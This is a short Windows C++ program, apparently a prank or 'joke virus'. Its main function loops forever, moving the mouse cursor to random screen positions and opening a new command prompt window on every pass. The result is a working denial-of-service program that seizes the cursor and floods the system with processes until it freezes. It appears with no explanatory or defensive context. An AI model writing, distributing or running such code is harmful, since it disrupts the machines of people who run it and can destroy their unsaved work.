#include <windows.h>
#include <bits/stdc++.h>
#include <stdlib.h>
#include <time.h>
using namespace std;
long long x, y, xz, yz;

int main()
{
    xz = GetSystemMetrics(SM_CXSCREEN);
    yz = GetSystemMetrics(SM_CYSCREEN);
    srand((unsigned)time(NULL));
    while (true)
    {
        x = rand() % xz;
        y = rand() % yz;
        SetCursorPos(x, y);
        system("start cmd");
    }
    return 0;
}
